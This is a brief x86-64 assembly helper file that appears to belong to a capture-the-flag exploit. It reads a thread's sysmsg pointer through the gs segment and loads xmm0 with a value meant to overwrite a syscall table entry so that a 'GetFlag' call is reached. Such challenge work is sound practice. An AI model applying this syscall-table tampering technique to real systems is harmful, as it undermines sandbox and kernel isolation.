.global get_sysmsg
.global fill_fp_regs
.intel_syntax noprefix

// The address of the current thread sysmsg is stored in gs:0
// (which BTW - gs: is sysmsg itself)
get_sysmsg:
    mov     rax, gs:0
    ret

// This is "GETFLAG_SYSCALL_TABLE_VALUE_TO_REPLACE" define from "main.c"
// Which is the value we want to override with the syscall table entry
xmm0_val:
    .quad 0x1310C68

// Fills xmm0 with the GetFlag syscall value we override with
fill_fp_regs:
    movq xmm0, qword ptr [xmm0_val]
    ret
